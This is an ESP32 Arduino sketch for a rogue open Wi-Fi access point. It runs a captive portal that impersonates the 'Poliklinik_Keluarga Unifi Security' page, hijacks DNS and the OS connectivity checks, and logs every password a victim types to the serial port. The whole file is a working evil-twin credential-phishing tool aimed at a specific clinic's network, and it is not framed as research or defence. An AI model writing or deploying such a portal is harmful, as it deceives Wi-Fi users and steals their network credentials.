#include <Arduino.h>
// this code is in Dev Mod 
// Captive Portal
//Blaxckroses
#include <AsyncTCP.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <esp_wifi.h>


const char *ssid = "TESTWIFI";  // FYI The SSID can't have a space in it.
const char *password = NULL;   // no password
// i 2 try define more client 
#define MAX_CLIENTS 4
#define WIFI_CHANNEL 6

const IPAddress localIP(4, 3, 2, 1);
const IPAddress gatewayIP(4, 3, 2, 1);
const IPAddress subnetMask(255, 255, 255, 0);

const String localIPURL = "http://4.3.2.1";

const char index_html[] PROGMEM = R"=====(
  <!DOCTYPE html>
  <html>
    <head>
      <title>UNIFI SECURITY CHECK</title>
      <style>
        body {
          background-color: #DC7633;
        }
        h1 {
          color: blue;
        }
        h2 {
          color: white;
        }
        input[type="text"], input[type="password"] {
          width: 100%;
          padding: 12px 20px;
          margin: 8px 0;
          box-sizing: border-box;
        }
        input[type="submit"] {
          background-color: #4CAF50;
          color: white;
          padding: 14px 20px;
          margin: 8px 0;
          border: none;
          cursor: pointer;
          width: 100%;
        }
        input[type="submit"]:hover {
          background-color: #45a049;
        }
      </style>
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
    </head>
    <body>
      <h1>Welcome to the Poliklinik_Keluarga Unifi Security</h1>
      <h2>Please enter the password to access the network:</h2>
      <form action="/login" method="post">
        <input type="password" id="password" name="password" placeholder="Password">
        <input type="submit" value="Submit">
      </form>
    </body>
  </html>
)=====";

DNSServer dnsServer;
AsyncWebServer server(80);

void handleLogin(AsyncWebServerRequest *request) {
  // Check if this is a POST request
  if (request->method() == HTTP_POST) {
    // Get the password parameter from the request
    if (request->hasParam("password", true)) {
      AsyncWebParameter* p = request->getParam("password", true);
      Serial.print("Entered password: ");
      Serial.println(p->value());

      // Toggle built-in LED pin to blink blue
      pinMode(LED_BUILTIN, OUTPUT);
      for (int i = 0; i < 5; i++) {  // Blink 5 times
        digitalWrite(LED_BUILTIN, HIGH);  // Turn LED on
        delay(500);  // Wait for 500 milliseconds
        digitalWrite(LED_BUILTIN, LOW);   // Turn LED off
        delay(500);  // Wait for 500 milliseconds
      }
    }
  }

  // Redirect the user to a success page or handle authentication logic here
  request->redirect("/");
}



void setUpDNSServer(DNSServer &dnsServer, const IPAddress &localIP) {
  dnsServer.setTTL(3600);
  dnsServer.start(53, "*", localIP);
}

void startSoftAccessPoint(const char *ssid, const char *password, const IPAddress &localIP, const IPAddress &gatewayIP) {
  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAPConfig(localIP, gatewayIP, subnetMask);
  WiFi.softAP(ssid, password, WIFI_CHANNEL, 0, MAX_CLIENTS);

  esp_wifi_stop();
  esp_wifi_deinit();
  wifi_init_config_t my_config = WIFI_INIT_CONFIG_DEFAULT();
  my_config.ampdu_rx_enable = false;
  esp_wifi_init(&my_config);
  esp_wifi_start();
  vTaskDelay(100 / portTICK_PERIOD_MS);  // Add a small delay
}

void setUpWebserver(AsyncWebServer &server, const IPAddress &localIP) {
  server.on("/connecttest.txt", [](AsyncWebServerRequest *request) { request->redirect("http://logout.net"); });
  server.on("/wpad.dat", [](AsyncWebServerRequest *request) { request->send(404); });

  server.on("/generate_204", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });
  server.on("/redirect", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });
  server.on("/hotspot-detect.html", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });
  server.on("/canonical.html", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });
  server.on("/success.txt", [](AsyncWebServerRequest *request) { request->send(200); });
  server.on("/ncsi.txt", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });

  server.on("/favicon.ico", [](AsyncWebServerRequest *request) { request->send(404); });

  server.on("/", HTTP_ANY, [](AsyncWebServerRequest *request) {
    AsyncWebServerResponse *response = request->beginResponse(200, "text/html", index_html);
    response->addHeader("Cache-Control", "public,max-age=31536000");
    request->send(response);
    Serial.println("Served Basic HTML Page");
  });

  server.onNotFound([](AsyncWebServerRequest *request) {
    request->redirect(localIPURL);
    Serial.print("onnotfound ");
    Serial.print(request->host());
    Serial.print(" ");
    Serial.print(request->url());
    Serial.print(" sent redirect to " + localIPURL + "\n");
  });

  server.on("/login", HTTP_POST, handleLogin);

  server.on("/login", HTTP_GET, [](AsyncWebServerRequest *request) {
    AsyncWebServerResponse *response = request->beginResponse_P(200, "text/html", index_html);
    response->addHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    request->send(response);
  });
}

void setup() {
  Serial.setTxBufferSize(1024);
  Serial.begin(115200);

  while (!Serial);

  Serial.println("\n\nCaptive Test, V1.0 Blaxckroses" __DATE__ " " __TIME__ " by CD_FER");
  Serial.printf("%s-%d\n\r", ESP.getChipModel(), ESP.getChipRevision());

  startSoftAccessPoint(ssid, password, localIP, gatewayIP);

  setUpDNSServer(dnsServer, localIP);

  setUpWebserver(server, localIP);
  server.begin();

  Serial.print("\n");
  Serial.print("Startup Time:");
  Serial.println(millis());
  Serial.print("\n");
  dnsServer.processNextRequest();
  delay(30);
}
